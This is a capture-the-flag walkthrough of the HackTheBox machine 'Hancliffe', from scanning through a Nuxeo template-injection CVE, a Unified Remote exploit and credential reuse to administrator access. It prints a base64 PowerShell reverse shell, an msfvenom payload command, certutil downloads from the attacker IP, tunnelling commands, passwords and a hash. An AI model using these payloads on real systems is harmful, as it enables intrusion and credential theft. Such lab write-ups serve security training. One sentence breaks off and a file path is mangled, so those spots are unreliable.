> Author: **[Revolt][author-profile]**

## Discovery

### Port Scanning

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.21.0
8000/tcp open  http    nginx 1.21.0
9999/tcp open  abyss?
```

Probably a Python / JS app.

### Directories

```bash
gobuster dir -u http://10.10.11.115:80/ -w /usr/share/wordlists/discovery/raft-medium-words.txt -o discovery/directories.80.txt
# /.                    (Status: 200) [Size: 612]
# /maintenance          (Status: 302) [Size: 0] [--> /nuxeo/Maintenance/]
# /Maintenance          (Status: 302) [Size: 0] [--> /nuxeo/Maintenance/]
# /con                  (Status: 500) [Size: 494]
# /nul                  (Status: 500) [Size: 494]
gobuster dir -u http://10.10.11.115:8000/ -w /usr/share/wordlists/discovery/raft-medium-words.txt -o discovery/directories.8000.txt
# /includes             (Status: 301) [Size: 169] [--> http://10.10.11.115:8000/includes/]
# /LICENSE              (Status: 200) [Size: 34501]
# /assets               (Status: 301) [Size: 169] [--> http://10.10.11.115:8000/assets/]
# /.                    (Status: 200) [Size: 7880]
# /license              (Status: 200) [Size: 34501]
# /Includes             (Status: 301) [Size: 169] [--> http://10.10.11.115:8000/Includes/]
# /Assets               (Status: 301) [Size: 169] [--> http://10.10.11.115:8000/Assets/]
# /con                  (Status: 500) [Size: 177]
# /License              (Status: 200) [Size: 34501]
# /INCLUDES             (Status: 301) [Size: 169] [--> http://10.10.11.115:8000/INCLUDES/]
# /.gitignore           (Status: 200) [Size: 9]
gobuster dir -u http://10.10.11.115:80/maintenance/ -w /usr/share/wordlists/discovery/raft-medium-words.txt -o discovery/directories.maintenance.80.txt
# /.xhtml               (Status: 401) [Size: 220]
# /.                    (Status: 200) [Size: 714]
# /.jsf                 (Status: 200) [Size: 117]
```

### Virtual Hosts

Here goes nothing:

```bash
ffuf -u http://10.10.11.115/ --domain hancliffe.htb --append-domain \
  -w /usr/share/wordlists/discovery/raft-medium-words.txt \
  -o discovery/vhosts.80.txt
```

### Web Browsing

On `10.10.11.115:80`, `/maintenance/` redirects to `/nuxeo/Maintenance/`, while
`/Maintenance/` displays this message:

[][screenshot-maintenance]

And the port 8000 hosts a password manager:

![][screenshot-hashpass]

## Break-in

Nginx has a known path traversal [vulnerability with aliases][nginx-path-traversal].

```bash
ffuf -u http://10.10.11.115/maintenance/..;/FUZZ \
  -w /usr/share/wordlists/discovery/raft-small-words.txt \
  -o discovery/files.maintenance.80.txt
```

The login page displays the version of Nuxeo: `10.2`. It has a known CVE, with
a [POC on github][cve-2018-16341].

After updating the path to `login.jsp` to match `/maintenance/..;/login.jsp`
and removing the code for UNIX, the POC returns a shell:

```bash
python www/cve-2018-16341.py
# [+] Checking template injection vulnerability => OK
# command (WIN)> whoami
# [+] Executing command =>
# hancliffe\svc_account
```

It is not fully funtional, but it can be used to execute a reverse shell.
We generate it with a utility script:

```python
payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)
cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
```

In the end I hardcoded the reverse shell in the CVE script so it'd be faster.

## Lateral Movement

```powershell
get-nettcpconnection | where {($_.State -eq "Listen") -and ($_.RemoteAddress -eq "0.0.0.0")} | select LocalAddress,LocalPort,RemoteAddress,RemotePort,State,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).Path}} | ft
```

```
LocalAddress LocalPort RemoteAddress RemotePort  State Process        
------------ --------- ------------- ----------  ----- -------        
0.0.0.0          49668 0.0.0.0                0 Listen services       
0.0.0.0          49667 0.0.0.0                0 Listen svchost        
0.0.0.0          49666 0.0.0.0                0 Listen svchost        
0.0.0.0          49665 0.0.0.0                0 Listen wininit        
0.0.0.0          49664 0.0.0.0                0 Listen lsass          
0.0.0.0           9999 0.0.0.0                0 Listen svchost        
0.0.0.0           9770 0.0.0.0                0 Listen MyFirstApp     
0.0.0.0           9512 0.0.0.0                0 Listen RemoteServerWin
0.0.0.0           9510 0.0.0.0                0 Listen RemoteServerWin
127.0.0.1         9300 0.0.0.0                0 Listen java           
127.0.0.1         9200 0.0.0.0                0 Listen java           
127.0.0.1         8080 0.0.0.0                0 Listen java           
127.0.0.1         8009 0.0.0.0                0 Listen java           
127.0.0.1         8005 0.0.0.0                0 Listen java           
0.0.0.0           8000 0.0.0.0                0 Listen nginx          
0.0.0.0           5432 0.0.0.0                0 Listen postgres       
0.0.0.0           5040 0.0.0.0                0 Listen svchost        
10.10.11.115       139 0.0.0.0                0 Listen System         
0.0.0.0            135 0.0.0.0                0 Listen svchost        
0.0.0.0             80 0.0.0.0                0 Listen nginx
```

Port 9512 and 9770 both look interesting.

The service listening on port 9512 is `Unified Remote`: it is unsual enough
to warrant closer inspection.

It is available from the local host only, so we forward it first:

```bash
./chisel server -p 8888 --reverse
```

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.16.48:8000/chisel.exe', 'C:\Nuxeo\chisel.exe')
./chisel.exe client 10.10.16.48:8888 R:9512:127.0.0.1:9512
```

Nmap fails to identify the service, but the port scan from Powershell tells
us it's the `Unified Remote 3.9`:

```bash
searchsploit 'unified remote'
# ----------------------------------------------------------------------------------------------------- ---------------------------------
#  Exploit Title                                                                                       |  Path
# ----------------------------------------------------------------------------------------------------- ---------------------------------
# CA Unified Infrastructure Management Nimsoft 7.80 - Remote Buffer Overflow                           | windows/remote/48156.c
# Cisco Unified Operations Manager 8.5 - Common Services Device Center Cross-Site Scripting            | hardware/remote/35780.txt
# Cisco Unified Operations Manager 8.5 - 'iptm/advancedfind.do?extn' Cross-Site Scripting              | hardware/remote/35762.txt
# Cisco Unified Operations Manager 8.5 - 'iptm/ddv.do?deviceInstanceName' Cross-Site Scripting         | hardware/remote/35763.txt
# Cisco Unified Operations Manager 8.5 - iptm/eventmon Multiple Cross-Site Scripting Vulnerabilities   | hardware/remote/35764.txt
# Cisco Unified Operations Manager 8.5 - '/iptm/faultmon/ui/dojo/Main/eventmon_wrapper.jsp' Multiple C | hardware/remote/35765.txt
# Cisco Unified Operations Manager 8.5 - '/iptm/logicalTopo.do' Multiple Cross-Site Scripting Vulnerab | hardware/remote/35766.txt
# Cisco Unified Operations Manager - Multiple Vulnerabilities                                          | windows/remote/17304.txt
# Comodo Unified Threat Management Web Console 2.7.0 - Remote Code Execution                           | multiple/webapps/48825.py
# McAfee Unified Threat Management Firewall 4.0.6 - 'page' Cross-Site Scripting                        | windows/remote/34115.txt
# NVR SP2 2.0 'nvUnifiedControl.dll 1.1.45.0' - 'SetText()' Command Execution                          | windows/remote/4322.html
# Sun ONE Unified Development Server 5.0 - Recursive Document Type Definition                          | multiple/remote/22178.xml
# Unified Remote 3.9.0.2463 - Remote Code Execution                                                    | windows/remote/49587.py
searchsploit -m 49587
```

This exploit requires a payload:

```bash
msfvenom --arch x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=10.10.16.48 LPORT=7777 -f exe -o rs.exe
```

And the script uploads the reverse shell itself, but requires to setup a
webserver. So we upload it manually before running the exploit:

```powershell
certutil.exe -f -urlcache "http://10.10.16.48:8000/rs.exe" "C:\Nuxeo\rs.exe"
```

(as hancliffe\svc_account)

And point the exploit to `C:\Nuxeo\rs.exe` since `C:\Windows\Temp` failed.

Then we can finally exploit the local port 9512, forwarded from the server:

```bash
nc -lvnp 7777
/usr/bin/python2.7 49587.py 127.0.0.1 10.10.16.48 rs.exe
```

Finally!

## Still on the Move

The previous enumerations identified vectors that weren't used yet:

- `MyFirstApp`, listening on port 9770
- [`Hashpass`][hashpass-github], listening on port 8000
- the `Brankas Application` on port 9999

The stateless password generator will always return the same result for a 

Browsing through the profile folders:

```powershell
type C:\Users\clara\App logins.json\Mozilla\Firefox\Profiles\ljftf853.default-release\logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"http://localhost:8000","httpRealm":null,"formSubmitURL":"http://localhost:8000","usernameField":"website","passwordField":"masterpassword","encryptedUsername":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECP+7GREfh/OCBBACN8BqXSHhgvedk/ffsRBn","encryptedPassword":"MFIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEQe5quezh5lBCg7VV7cXOky4tBMinRRncbXJl1YC3P0Ql5J8ZZS6ZnVjg9yXrbOq1Me","guid":"{39d1884b-56cd-4e30-869b-e0d9df6ca9d9}","encType":1,"timeCreated":1624771259387,"timeLastUsed":1624771259387,"timePasswordChanged":1624771259387,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

Since "hostname" is `localhost:8000`, the encrypted password is most likely
the master password for Hashpass. These can be cracked with [Firefox Decrypt][firefox-decrypt].

> ``#@H@ncLiff3D3velopm3ntM@st3rK3y*!``

Next the Hashpass service on port 8000 claims that it will always return the
same output for any given input. Hoping that the employees used this service
too, we try to retrieve the credentials of the `development` user:

```
Full Name: development
Website: hancliffe.htb
Password: `#@H@ncLiff3D3velopm3ntM@st3rK3y*!`
```

> development AMl.q2DHp?2.C/V0kNFU

Then we can execute commands as development:

```powershell
./chisel.exe client 10.10.16.48:8888 R:5985:127.0.0.1:5985
```

```bash
evil-winrm -i 127.0.0.1 -u development -p 'AMl.q2DHp?2.C/V0kNFU'
```

## Escalation

Now it is finally possible to access "MyFirstApp" and download it via
Evil-WinRM.

Next we load the app in Ghidra and explore the code. The app is vulnerable
to the socket reuse attack, as detailed [here][article-socket-reuse].

```bash
evil-winrm -i 127.0.0.1 -u administrator -H 2e5e9a333abf90ec9673220eb3befb83
```

[author-profile]: https://app.hackthebox.eu/users/189435

[article-socket-reuse]: https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/
[cve-2018-16341]: https://github.com/mpgn/CVE-2018-16341
[firefox-ecrypt]: https://github.com/unode/firefox_decrypt
[hashpass-github]: https://github.com/scottparry/hashpass
[nginx-path-traversal]: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx
[screenshot-hashpass]: images/screenshots/hashpass.png
[screenshot-maintenance]: images/screenshots/maintenance.png
